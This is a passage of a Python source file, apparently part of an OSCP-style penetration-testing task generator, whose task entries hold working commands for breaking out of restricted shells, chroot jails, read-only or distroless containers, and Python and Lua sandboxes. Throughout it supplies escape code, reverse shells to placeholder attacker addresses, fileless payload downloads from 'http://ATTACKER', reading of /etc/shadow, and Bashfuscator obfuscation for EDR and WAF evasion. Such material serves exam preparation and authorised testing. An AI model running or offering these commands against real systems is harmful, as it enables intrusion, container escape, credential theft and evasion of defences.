                        'chroot syscall failed',
                        'Still restricted after execution'
                    ],
                    'next_steps': [
                        'Verify with: ls -la /',
                        'Check real root: ls -id / ; ls -id /proc/1/root/.',
                        'Access sensitive files: cat /etc/shadow',
                        'Privilege escalation if needed'
                    ],
                    'alternatives': [
                        'Python: os.mkdir("chroot-dir"); os.chroot("chroot-dir"); [os.chdir("..") for i in range(1000)]; os.chroot("."); os.system("/bin/bash")',
                        'Perl: mkdir "chroot-dir"; chroot "chroot-dir"; chdir ".." foreach (0..1000); chroot "."; system("/bin/bash");',
                        'Use chw00t tool: https://github.com/earthquake/chw00t',
                        'Saved FD method (see next task)'
                    ],
                    'notes': 'Works because Linux allows only ONE chroot per process. Creating nested chroot invalidates outer one.',
                    'c_code': '''#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}''',
                    'python_code': '''#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")''',
                    'time_estimate': '5 minutes'
                }
            })

            # Task 4.3: Root + mount escape
            chroot_escape['children'].append({
                'id': 'mount-chroot-escape',
                'name': 'Mount-Based Chroot Escape',
                'type': 'command',
                'metadata': {
                    'command': 'mkdir /tmp/escape; mount --bind / /tmp/escape; chroot /tmp/escape /bin/bash',
                    'description': 'Mount real root filesystem into chroot directory and chroot into it',
                    'tags': ['OSCP:MEDIUM', 'CHROOT', 'ROOT_REQUIRED'],
                    'flag_explanations': {
                        'mkdir /tmp/escape': 'Create mount point inside chroot',
                        'mount --bind': 'Bind mount (mirror directory tree)',
                        '/': 'Source: real root filesystem',
                        '/tmp/escape': 'Target: directory inside chroot',
                        'chroot /tmp/escape': 'Chroot into bind-mounted real root'
                    },
                    'success_indicators': [
                        'Mount succeeds without errors',
                        'New bash shell has full filesystem access',
                        'Can see all system directories',
                        'Chroot restriction bypassed'
                    ],
                    'failure_indicators': [
                        'mount: permission denied (need CAP_SYS_ADMIN)',
                        'mount command not available',
                        'Device or resource busy error'
                    ],
                    'next_steps': [
                        'Verify escape: ls -la /',
                        'Check capabilities: capsh --print',
                        'If mount unavailable: try /proc method',
                        'Escalate privileges if needed'
                    ],
                    'alternatives': [
                        'Mount /proc: mkdir /tmp/proc; mount -t proc proc /tmp/proc; chroot /tmp/proc/1/root /bin/bash',
                        'Loop device: losetup /dev/loop0 /real-root-image; mount /dev/loop0 /tmp/escape',
                        'Overlay: mount -t overlay overlay -olowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /tmp/escape'
                    ],
                    'notes': 'Requires root or CAP_SYS_ADMIN capability. Simple and reliable if you have mount access.',
                    'time_estimate': '2 minutes'
                }
            })

            # Task 4.4: /proc based escape
            chroot_escape['children'].append({
                'id': 'proc-chroot-escape',
                'name': '/proc Based Chroot Escape',
                'type': 'command',
                'metadata': {
                    'command': 'mount -t proc proc /proc 2>/dev/null; cd /proc/1/root; chroot . /bin/bash',
                    'description': 'Use /proc/1/root to access init process root directory (real filesystem)',
                    'tags': ['OSCP:MEDIUM', 'CHROOT', 'ROOT_REQUIRED'],
                    'flag_explanations': {
                        'mount -t proc': 'Mount procfs if not already mounted',
                        'proc /proc': 'Type proc mounted at /proc',
                        'cd /proc/1/root': 'Change to init process root directory',
                        '/proc/1/root': 'Symlink to init\'s root (outside chroot)',
                        'chroot .': 'Chroot to current directory (real root)'
                    },
                    'success_indicators': [
                        '/proc/1/root accessible',
                        'Successfully changed to real root directory',
                        'Chroot to real root succeeded',
                        'Full filesystem access restored'
                    ],
                    'failure_indicators': [
                        'Permission denied on /proc/1/root',
                        '/proc not mounted and cannot mount',
                        'chroot command failed'
                    ],
                    'next_steps': [
                        'Check other process roots: ls -la /proc/*/root',
                        'Access via FD: ls -la /proc/1/fd/*',
                        'Read init environ: cat /proc/1/environ',
                        'Try cwd instead: cd /proc/1/cwd'
                    ],
                    'alternatives': [
                        'Direct access: bash -c "cd /proc/1/root && exec bash"',
                        'Via symlink: ln -s /proc/1/root /tmp/real; cd /tmp/real',
                        'Other PIDs: cd /proc/self/root/../1/root',
                        'Use cwd: cd /proc/1/cwd (process current working dir)'
                    ],
                    'notes': '/proc/1/root is init process root - always outside chroot. Requires /proc to be mounted.',
                    'time_estimate': '2 minutes'
                }
            })

            tasks['children'].append(chroot_escape)

        # PHASE 5: Container Escapes (read-only / noexec / distroless)
        if is_container or is_readonly:
            container_escape = {
                'id': 'container-escapes',
                'name': 'Container and Filesystem Protection Bypasses',
                'type': 'parent',
                'children': []
            }

            # Task 5.1: Script-based execution
            container_escape['children'].append({
                'id': 'script-bypass-noexec',
                'name': 'Script Execution Bypass (noexec)',
                'type': 'command',
                'metadata': {
                    'command': 'python -c "import os; os.system(\'id\')"; sh /dev/shm/script.sh; perl /dev/shm/script.pl',
                    'description': 'Execute scripts with interpreters to bypass noexec mount option',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CONTAINER'],
                    'flag_explanations': {
                        'python -c': 'Execute Python code from command line',
                        'sh script.sh': 'Execute shell script via interpreter (not direct execution)',
                        'perl script.pl': 'Execute Perl script via interpreter',
                        '/dev/shm': 'Writable location even in ro filesystem'
                    },
                    'success_indicators': [
                        'Script executed successfully',
                        'Commands from script ran despite noexec',
                        'Output displayed as expected'
                    ],
                    'failure_indicators': [
                        'Interpreters not available',
                        '/dev/shm not writable',
                        'Script syntax errors'
                    ],
                    'next_steps': [
                        'Upload backdoor scripts (python, perl, ruby)',
                        'Use for enumeration scripts',
                        'For binaries: use memory execution techniques',
                        'Check for other scripting languages: node, ruby'
                    ],
                    'alternatives': [
                        'Node.js: node -e "require(\'child_process\').exec(\'id\')"',
                        'Ruby: ruby -e "system(\'id\')"',
                        'Bash: bash -c "id" (if bash available)',
                        'Read script: sh < /dev/shm/script.sh',
                        'Pipe: echo "id" | sh'
                    ],
                    'notes': 'Noexec only blocks direct execution. Interpreters bypass it. Download scripts, not binaries.',
                    'time_estimate': '1 minute'
                }
            })

            # Task 5.2: Memory FD execution (Python)
            if has_python:
                container_escape['children'].append({
                    'id': 'memfd-python-exec',
                    'name': 'Memory FD Binary Execution (Python)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute binaries from memory using memfd_create syscall via Python',
                        'tags': ['OSCP:HIGH', 'ADVANCED', 'CONTAINER', 'MEMORY_EXEC'],
                        'steps': [
                            '1. Install fileless-elf-exec on attacker: pip3 install fileless-elf-exec',
                            '2. Generate payload: fileless-elf-exec /bin/bash -o bash_exec.py -l python',
                            '3. Transfer to target: wget http://ATTACKER/bash_exec.py -O /dev/shm/exec.py',
                            '4. Execute: python3 /dev/shm/exec.py',
                            '5. Binary runs from memory, bypassing noexec'
                        ],
                        'flag_explanations': {
                            'memfd_create': 'Syscall to create anonymous file in RAM',
                            'fileless-elf-exec': 'Tool to generate memory execution scripts',
                            '-o bash_exec.py': 'Output Python script',
                            '-l python': 'Language: python',
                            'ctypes': 'Python library for syscall access'
                        },
                        'success_indicators': [
                            'Binary executed from memory',
                            'Noexec protection bypassed',
                            'Full binary functionality available',
                            'No file written to disk'
                        ],
                        'failure_indicators': [
                            'Python ctypes not available',
                            'Kernel too old (< 3.17, no memfd_create)',
                            'Seccomp blocks memfd_create syscall'
                        ],
                        'next_steps': [
                            'Execute custom binaries (backdoors, exploit tools)',
                            'Run kubectl for Kubernetes enumeration',
                            'Execute privilege escalation exploits',
                            'Try DDexec if memfd unavailable'
                        ],
                        'alternatives': [
                            'Perl version: fileless-elf-exec /bin/bash -o exec.pl -l perl',
                            'Ruby version: fileless-elf-exec /bin/bash -o exec.rb -l ruby',
                            'DDexec (no memfd required): bash ddexec.sh /bin/bash',
                            'Manual memfd: Use ctypes to call syscall(319, ...) for memfd_create'
                        ],
                        'notes': 'Requires Python with ctypes and kernel >= 3.17. Best method for distroless containers with Python.',
                        'tool_url': 'https://github.com/nnsee/fileless-elf-exec',
                        'time_estimate': '5 minutes'
                    }
                })

            # Task 5.3: DDexec technique
            container_escape['children'].append({
                'id': 'ddexec-technique',
                'name': 'DDexec/EverythingExec Memory Hijacking',
                'type': 'manual',
                'metadata': {
                    'description': 'Execute arbitrary binaries by hijacking current process memory via /proc/self/mem',
                    'tags': ['OSCP:HIGH', 'ADVANCED', 'CONTAINER', 'MEMORY_EXEC'],
                    'steps': [
                        '1. Download DDexec: wget https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh',
                        '2. Download target binary: wget http://ATTACKER/binary.elf',
                        '3. Encode binary: base64 -w0 binary.elf > binary.b64',
                        '4. Execute: cat binary.b64 | bash ddexec.sh argv0 arg1 arg2',
                        '5. DDexec hijacks bash process and runs binary from memory'
                        ],
                        'flag_explanations': {
                            '/proc/self/mem': 'Memory mapping of current process',
                            'ddexec.sh': 'Shell script that writes shellcode to memory',
                            'base64 -w0': 'Encode binary without line wrapping',
                            'argv0 arg1': 'Arguments passed to binary',
                            'dd': 'Used for lseek through memory file'
                        },
                        'success_indicators': [
                            'Binary executes from memory',
                            'No files written to disk',
                            'Bypasses ro, noexec, distroless protections',
                            'Process memory successfully hijacked'
                        ],
                        'failure_indicators': [
                            'dd command not available (try SEEKER=tail)',
                            '/proc/self/mem not writable',
                            'Shell not supported (need bash/zsh/ash)',
                            'Required tools missing (head, tail, cut, grep, od, tr, base64)'
                        ],
                        'next_steps': [
                            'If dd unavailable: SEEKER=tail bash ddexec.sh ...',
                            'Try alternative seekers: SEEKER=cmp or SEEKER=xxd',
                            'Use memexec for daemon mode (persistent memory execution)',
                            'Check for memdlopen for library loading'
                        ],
                        'alternatives': [
                            'With tail: SEEKER=tail bash ddexec.sh ls -la <<< $(base64 -w0 /bin/ls)',
                            'With cmp: SEEKER=cmp bash ddexec.sh ls -la <<< $(base64 -w0 /bin/ls)',
                            'With xxd: SEEKER=xxd SEEKER_ARGS=\'-s $offset\' zsh ddexec.sh ls',
                            'Memexec daemon: Use memexec for persistent binary loading',
                            'Memdlopen: Load libraries with dependencies in memory'
                        ],
                        'notes': 'Works with only basic shell tools. Bypasses ALL file-based protections. Gold standard for distroless.',
                        'tool_url': 'https://github.com/arget13/DDexec',
                        'dependencies': ['dd/tail/cmp/xxd', 'bash/zsh/ash', 'head', 'cut', 'grep', 'od', 'readlink', 'wc', 'tr', 'base64'],
                        'time_estimate': '5-10 minutes'
                    }
                })

            # Task 5.4: Distroless reverse shell
            container_escape['children'].append({
                'id': 'distroless-reverse-shell',
                'name': 'Distroless Container Reverse Shell',
                'type': 'manual',
                'metadata': {
                    'description': 'Get reverse shell in distroless container using available scripting language',
                    'tags': ['OSCP:HIGH', 'CONTAINER', 'REVERSE_SHELL'],
                    'steps': [
                        '1. Identify available interpreter (python, node, java, ruby, perl)',
                        '2. Use language-specific reverse shell:',
                        '   - Python: python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                        '   - Node: node -e \'require("child_process").exec("bash -c \\\'bash -i >& /dev/tcp/IP/PORT 0>&1\\\'")\'',
                        '   - Java: Runtime.getRuntime().exec("bash -c {echo,BASE64}|{base64,-d}|{bash,-i}");',
                        '3. Listener on attacker: nc -lvnp PORT',
                        '4. Execute payload on target',
                        '5. Use language for enumeration (no ls, cat, etc.)'
                        ],
                        'flag_explanations': {
                            'socket.socket()': 'Create network socket',
                            's.connect()': 'Connect to attacker',
                            'os.dup2()': 'Duplicate file descriptors (redirect I/O)',
                            'subprocess.call()': 'Execute shell',
                            'require("child_process")': 'Node.js process spawning'
                        },
                        'success_indicators': [
                            'Reverse shell connection established',
                            'Interactive prompt on attacker machine',
                            'Can execute language-specific enumeration',
                            'Bypassed missing shell binaries'
                        ],
                        'failure_indicators': [
                            'No scripting language available',
                            'Outbound connections blocked',
                            'Syntax errors in payload',
                            'Language restricted (no socket/subprocess)'
                        ],
                        'next_steps': [
                            'Enumerate with language: os.listdir("/") in Python',
                            'Read files: open("/etc/passwd").read()',
                            'Execute binaries from memory: Use DDexec/memfd techniques',
                            'Check for Kubernetes: os.path.exists("/var/run/secrets/kubernetes.io")'
                        ],
                        'alternatives': [
                            'Python HTTP server: python -m http.server 8000 (exfiltration)',
                            'Node bind shell: net.createServer((s)=>{s.on("data",(d)=>{s.write(execSync(d).toString())})}).listen(PORT)',
                            'Ruby: require "socket";exit if fork;c=TCPSocket.new("IP","PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}',
                            'Perl: use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
                        ],
                        'notes': 'Distroless = no shell/coreutils. Must use app language for everything. Example: https://github.com/carlospolop/DistrolessRCE',
                        'python_enum': [
                            'import os; os.listdir("/")  # List directory',
                            'open("/etc/passwd").read()  # Read file',
                            'os.system("command")  # Execute command if available',
                            'import subprocess; subprocess.check_output(["cmd","arg"])  # Run command'
                        ],
                        'time_estimate': '5 minutes'
                    }
                })

            tasks['children'].append(container_escape)

        # PHASE 6: Python Jail Escape
        if shell_type == 'python' or has_python:
            python_jail = {
                'id': 'python-jail-escapes',
                'name': 'Python Sandbox/Jail Escape Techniques',
                'type': 'parent',
                'children': []
            }

            python_jail['children'].append({
                'id': 'python-jail-techniques',
                'name': 'Python Sandbox Escape Techniques',
                'type': 'manual',
                'metadata': {
                    'description': 'Escape Python restricted execution environments and sandboxes',
                    'tags': ['OSCP:MEDIUM', 'PYTHON', 'JAIL'],
                    'techniques': [
                        '1. Import os module: __import__("os").system("bash")',
                        '2. Bypass __builtins__ restriction: ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__[\'sys\'].modules[\'os\'].system(\'bash\')',
                        '3. Use subprocess: __import__("subprocess").call(["bash"])',
                        '4. File object exploit: open("/etc/passwd").read()',
                        '5. Code object execution: compile("__import__(\'os\').system(\'bash\')", "<string>", "exec")',
                        '6. Eval/exec if available: eval("__import__(\'os\').system(\'bash\')")',
                        '7. Input function abuse: input() can execute code in Python 2'
                    ],
                    'success_indicators': [
                        'Shell spawned from Python',
                        'Arbitrary code execution achieved',
                        'Sandbox restrictions bypassed',
                        'Access to os/subprocess modules'
                    ],
                    'failure_indicators': [
                        '__builtins__ fully restricted',
                        'All dangerous modules blocked',
                        'AST parsing prevents dangerous code',
                        'Seccomp blocks syscalls'
                    ],
                    'next_steps': [
                        'Enumerate available modules: dir()',
                        'Check subclasses: [].__class__.__base__.__subclasses__()',
                        'Find file objects for reading arbitrary files',
                        'Use pickle for code execution if available'
                    ],
                    'alternatives': [
                        'Object traversal: ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__[\'sys\'].modules[\'os\'].system(\'bash\')',
                        'Subprocess: __import__("subprocess").Popen(["bash"])',
                        'Exec: exec("import os; os.system(\'bash\')")',
                        'Commands module: __import__("commands").getoutput("bash")',
                        'Pickle: pickle.loads(b"cos\\nsystem\\n(S\'bash\'\\ntR.")'
                    ],
                    'notes': 'See full Python sandbox bypass guide: hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes/',
                    'payloads': [
                        '__import__("os").system("bash")',
                        '().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__[\'sys\'].modules[\'os\'].system(\'bash\')',
                        '__import__("subprocess").call(["bash"])',
                        'exec("import os; os.system(\'bash\')")',
                        'eval("__import__(\'os\').system(\'bash\')")'
                    ],
                    'time_estimate': '10-15 minutes'
                }
            })

            tasks['children'].append(python_jail)

        # PHASE 7: Lua Jail Escape
        lua_jail = {
            'id': 'lua-jail-escapes',
            'name': 'Lua Sandbox Escape Techniques',
            'type': 'parent',
            'children': []
        }

        lua_jail['children'].append({
            'id': 'lua-jail-techniques',
            'name': 'Lua Sandbox Escape Methods',
            'type': 'manual',
            'metadata': {
                'description': 'Escape Lua restricted environments and execute system commands',
                'tags': ['OSCP:LOW', 'LUA', 'JAIL'],
                'techniques': [
                    '1. Direct os.execute: os.execute("bash")',
                    '2. Load with char encoding: load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x62,0x61,0x73,0x68,0x27,0x29))()',
                    '3. Without dots: print(rawget(os, "execute")("bash"))',
                    '4. Rawget string: print(rawget(string, "char")(0x41, 0x42))',
                    '5. Enumerate library: for k,v in pairs(os) do print(k,v) end',
                    '6. Brute force function order (CTF trick)'
                ],
                'success_indicators': [
                    'Shell spawned from Lua',
                    'os.execute command worked',
                    'Library functions enumerated',
                    'Code execution achieved'
                ],
                'failure_indicators': [
                    'os library disabled',
                    'string library restricted',
                    'load/loadstring functions disabled',
                    'Sandboxed environment too restrictive'
                ],
                'next_steps': [
                    'Get interactive Lua shell: debug.debug()',
                    'Enumerate globals: for k,v in pairs(_G) do print(k,v) end',
                    'Check available libraries: print(os, string, io, debug)',
                    'Try file I/O if available: io.open("/etc/passwd"):read("*a")'
                ],
                'alternatives': [
                    'String char: print(string.char(0x41, 0x42))',
                    'Without dots: print(rawget(string, "char")(0x41, 0x42))',
                    'Debug shell: debug.debug()',
                    'Load code: load("os.execute(\'bash\')")()',
                    'Loadstring: loadstring("os.execute(\'bash\')")()'
                ],
                'notes': 'Function order changes in each new Lua environment. May need brute force for CTF challenges.',
                'payloads': [
                    'os.execute("bash")',
                    'load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x62,0x61,0x73,0x68,0x27,0x29))()',
                    'print(rawget(os, "execute")("bash"))',
                    'debug.debug()',
                    'for k,v in pairs(os) do print(k,v) end'
                ],
                'bruteforce_example': 'for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x62,0x61,0x73,0x68))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done',
                'time_estimate': '5-10 minutes'
            }
        })

        tasks['children'].append(lua_jail)

        # PHASE 8: GTFOBins and Binary Exploitation
        gtfo_tasks = {
            'id': 'gtfobin-escapes',
            'name': 'GTFOBins Shell Escape Techniques',
            'type': 'parent',
            'children': []
        }

        gtfo_tasks['children'].append({
            'id': 'gtfobins-search',
            'name': 'Search GTFOBins for Shell Property Binaries',
            'type': 'manual',
            'metadata': {
                'description': 'Search GTFOBins database for binaries with shell escape capabilities',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'GTFOBIN'],
                'steps': [
                    '1. List available binaries: ls /usr/bin /usr/local/bin /bin /sbin',
                    '2. Check GTFOBins: https://gtfobins.github.io/',
                    '3. Search for binaries with "Shell" property',
                    '4. Test available binaries from your environment',
                    '5. Common: vim, find, awk, less, more, man, python, perl'
                ],
                'common_binaries': {
                    'vim/vi': 'vim -c ":!/bin/bash" or :!/bin/bash from inside',
                    'find': 'find / -name test -exec /bin/bash \\;',
                    'awk': 'awk \'BEGIN {system("/bin/bash")}\'',
                    'less/more': 'less /etc/passwd then !/bin/bash',
                    'man': 'man man then !/bin/bash',
                    'python': 'python -c \'import pty; pty.spawn("/bin/bash")\'',
                    'perl': 'perl -e \'exec "/bin/bash";\'',
                    'nmap': 'nmap --interactive then !bash (old nmap)',
                    'git': 'git help config then !/bin/bash',
                    'ftp': 'ftp then !/bin/bash'
                },
                'success_indicators': [
                    'Binary with shell property found',
                    'Shell spawned successfully',
                    'Restrictions bypassed',
                    'Full command access restored'
                ],
                'failure_indicators': [
                    'No GTFOBins available',
                    'All shell-capable binaries removed',
                    'Binary execution blocked',
                    'Spawned shell still restricted'
                ],
                'next_steps': [
                    'If vim available: :set shell=/bin/bash then :shell',
                    'If find available: find / -name test -exec /bin/bash \\;',
                    'If awk available: awk \'BEGIN {system("/bin/bash")}\'',
                    'Check for SUID binaries: find / -perm -4000 2>/dev/null'
                ],
                'alternatives': [
                    'Vi: vi -c ":!/bin/bash" or :set shell=/bin/bash then :shell',
                    'Nano: nano then Ctrl+R Ctrl+X then reset; bash',
                    'Less: less /etc/passwd then !/bin/bash or v for vim',
                    'Python: python -c \'import os; os.system("/bin/bash")\'',
                    'Ruby: ruby -e \'exec "/bin/bash"\''
                ],
                'notes': 'GTFOBins is essential reference. Memorize common patterns for exam.',
                'url': 'https://gtfobins.github.io/',
                'time_estimate': '5 minutes'
            }
        })

        gtfo_tasks['children'].append({
            'id': 'file-write-escape',
            'name': 'Create Executable Scripts in Writable Locations',
            'type': 'command',
            'metadata': {
                'command': 'echo "#!/bin/bash\\nbash" > /tmp/shell; chmod +x /tmp/shell; /tmp/shell',
                'description': 'Write shell script to writable location and execute (if PATH/exec not restricted)',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'flag_explanations': {
                    'echo "#!/bin/bash\\nbash"': 'Create shell script content',
                    '> /tmp/shell': 'Write to file in /tmp',
                    'chmod +x': 'Make executable',
                    '/tmp/shell': 'Execute script'
                },
                'success_indicators': [
                    'File written successfully',
                    'chmod succeeded',
                    'Script executed and spawned shell',
                    'Restrictions bypassed'
                ],
                'failure_indicators': [
                    '/tmp not writable',
                    'Cannot create executable files',
                    'Execution blocked by noexec',
                    'PATH restriction prevents execution'
                ],
                'next_steps': [
                    'If /tmp noexec: try /dev/shm',
                    'If no writable dirs: use memory execution',
                    'Try heredoc: cat > /tmp/shell <<EOF\\n#!/bin/bash\\nbash\\nEOF',
                    'Use wget to overwrite system files (if writable)'
                ],
                'alternatives': [
                    'Heredoc: cat > /tmp/shell <<EOF [newline] #!/bin/bash [newline] bash [newline] EOF',
                    'Printf: printf \'#!/bin/bash\\nbash\\n\' > /tmp/shell',
                    'Base64: echo IyEvYmluL2Jhc2gKYmFzaA== | base64 -d > /tmp/shell',
                    'Wget overwrite: wget http://attacker/bash -O /usr/local/bin/restricted_cmd'
                ],
                'notes': 'Simple but effective if you have write+exec permissions somewhere. Check /tmp, /dev/shm, /var/tmp.',
                'time_estimate': '1 minute'
            }
        })

        tasks['children'].append(gtfo_tasks)

        # PHASE 9: Advanced Techniques
        advanced = {
            'id': 'advanced-techniques',
            'name': 'Advanced Escape Techniques',
            'type': 'parent',
            'children': []
        }

        advanced['children'].append({
            'id': 'bashfuscator',
            'name': 'Bashfuscator Command Obfuscation',
            'type': 'command',
            'metadata': {
                'command': './bashfuscator -c "cat /etc/passwd"',
                'description': 'Obfuscate bash commands to bypass filters and signature detection',
                'tags': ['OSCP:LOW', 'ADVANCED', 'EVASION'],
                'flag_explanations': {
                    'bashfuscator': 'Tool to obfuscate bash commands',
                    '-c': 'Command to obfuscate',
                    'cat /etc/passwd': 'Example command'
                },
                'success_indicators': [
                    'Obfuscated command generated',
                    'Executes successfully despite filters',
                    'Bypasses signature-based detection'
                ],
                'failure_indicators': [
                    'Bashfuscator not available',
                    'Generated command still filtered',
                    'Syntax errors in obfuscated output'
                ],
                'next_steps': [
                    'Test obfuscated reverse shell',
                    'Combine with encoding techniques',
                    'Use for EDR/WAF evasion',
                    'Manual obfuscation if tool unavailable'
                ],
                'alternatives': [
                    'Manual: Use quote mixing, variable substitution, encoding',
                    'Base64 chain: echo <b64> | base64 -d | bash',
                    'Hex encoding: $(echo -e "\\x63\\x61\\x74...")',
                    'Variable obfuscation: a=c;b=at;$a$b /etc/passwd'
                ],
                'notes': 'Tool available: https://github.com/Bashfuscator/Bashfuscator - Generates complex obfuscation',
                'tool_url': 'https://github.com/Bashfuscator/Bashfuscator',
                'time_estimate': '5 minutes'
            }
        })

        advanced['children'].append({
            'id': 'rce-5-chars',
            'name': 'RCE with 5 Characters (Orange Tsai Technique)',
            'type': 'manual',
            'metadata': {
                'description': 'Execute arbitrary commands using only 5-character sequences (CTF technique)',
                'tags': ['OSCP:LOW', 'ADVANCED', 'CTF'],
                'technique': [
                    'Step 1: Generate "ls -t>g" to file "_"',
                    '  >ls\\  # Create file named "ls\\"',
                    '  ls>_  # Run ls, output to "_"',
                    '  >\\ \\  # File named " \\"',
                    '  >-t\\  # File named "-t\\"',
                    '  >\\>g  # File named ">g"',
                    '  ls>>_ # Append to "_", now contains: ls -t >g',
                    '',
                    'Step 2: Generate command in files, execute with "sh _"',
                    '  >on   >th\\  >py\\  >\\|\\  >tw\\  >e.\\  >ng\\  >ra\\  >o\\  >\\ \\  >rl\\  >cu\\',
                    '  sh _  # Executes "ls -t>g", writes "curl orange.tw|python" to file g',
                    '  sh g  # Executes payload'
                ],
                'success_indicators': [
                    'Files created with command fragments',
                    'Command assembled and executed',
                    'Severe character restrictions bypassed'
                ],
                'failure_indicators': [
                    'Cannot create files with special names',
                    'ls command not available',
                    'sh command restricted'
                ],
                'next_steps': [
                    'Use for extremely restricted environments',
                    'Adapt for specific command length limits',
                    'Combine with alphabetic ordering tricks',
                    'Use * wildcard for execution'
                ],
                'alternatives': [
                    '4-char version: Use >dir >sl >g> >ht- *>v then >rev *v>x',
                    'Wildcard: Create alphabetically ordered files, execute with *',
                    'Tar trick: >tar >zcf >zzz then * /h*',
                    'Ln: ln /f* (creates hard link to /flag.txt)'
                ],
                'notes': 'From Orange Tsai BabyFirst Revenge challenge. Extremely advanced, rarely needed in real pentests.',
                'reference': 'https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge',
                'time_estimate': '15-20 minutes'
            }
        })

        advanced['children'].append({
            'id': 'bash-nop-sled',
            'name': 'Bash NOP Sled (Bashsledding)',
            'type': 'manual',
            'metadata': {
                'description': 'Create NOP sled using spaces for memory corruption exploits calling system()',
                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT_DEV'],
                'technique': [
                    'When exploiting memory corruption that calls system():',
                    '1. Pad payload with spaces (Bash ignores leading whitespace)',
                    '2. Example: "                nc -e /bin/sh 10.0.0.1 4444"',
                    '   (16 spaces before real command)',
                    '3. If ROP chain lands anywhere in space block, bash skips to command',
                    '4. Works with bash, sh, ash (BusyBox)',
                    '5. Use when cannot write NULL bytes for alignment'
                ],
                'success_indicators': [
                    'Exploit lands in NOP sled',
                    'Bash skips whitespace and executes command',
                    'Reliable exploit on ASLR systems'
                ],
                'failure_indicators': [
                    'Exploit lands outside sled',
                    'Null bytes terminate payload early',
                    'Shell interpreter not bash/sh'
                ],
                'use_cases': [
                    'Memory-mapped config blobs (NVRAM)',
                    'Cannot write NULL bytes for alignment',
                    'Embedded devices with BusyBox',
                    'IoT routers with system() ROP gadgets'
                ],
                'alternatives': [
                    'Tab characters: bash ignores leading tabs too',
                    'Newlines: Multiple newlines also work',
                    'Mixed: Spaces + tabs + newlines'
                ],
                'notes': 'Advanced exploit development technique. Increases reliability of memory corruption exploits targeting system().',
                'time_estimate': 'Depends on exploit development'
            }
        })

        tasks['children'].append(advanced)

        # PHASE 10: Additional Resources and Tools
        resources = {
            'id': 'resources',
            'name': 'Tools and Resources',
            'type': 'parent',
            'children': []
        }

        resources['children'].append({
            'id': 'useful-tools',
            'name': 'Essential Shell Escape Tools',
            'type': 'manual',
            'metadata': {
                'description': 'Key tools and resources for shell escaping and jail breaking',
                'tags': ['RESOURCE', 'OSCP:MEDIUM'],
                'tools': {
                    'GTFOBins': 'https://gtfobins.github.io/ - Unix binary exploitation for shell escapes',
                    'chw00t': 'https://github.com/earthquake/chw00t - Automated chroot escape tool',
                    'DDexec': 'https://github.com/arget13/DDexec - Execute binaries from memory',
                    'memexec': 'https://github.com/arget13/memexec - Memory execution daemon',
                    'memdlopen': 'https://github.com/arget13/memdlopen - In-memory library loading',
                    'fileless-elf-exec': 'https://github.com/nnsee/fileless-elf-exec - Generate memfd execution scripts',
                    'Bashfuscator': 'https://github.com/Bashfuscator/Bashfuscator - Bash command obfuscation',
                    'DistrolessRCE': 'https://github.com/carlospolop/DistrolessRCE - Distroless container exploit examples'
                },
                'references': [
                    'PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection',
                    'WAF Bypass Cheat Sheet: https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet',
                    'Restricted Shell Escaping: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/',
                    'SANS Shell Escaping: https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells',
                    'HackTricks Python Sandboxes: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes/',
                    'DEF CON 31 Memory Manipulation: https://www.youtube.com/watch?v=poHirez8jk4',
                    'DDexec-ng Presentation: https://www.youtube.com/watch?v=VM_gjjiARaU'
                ],
                'notes': 'Bookmark these resources. GTFOBins and DDexec are essential for OSCP and real engagements.'
            }
        })

        tasks['children'].append(resources)

        return tasks
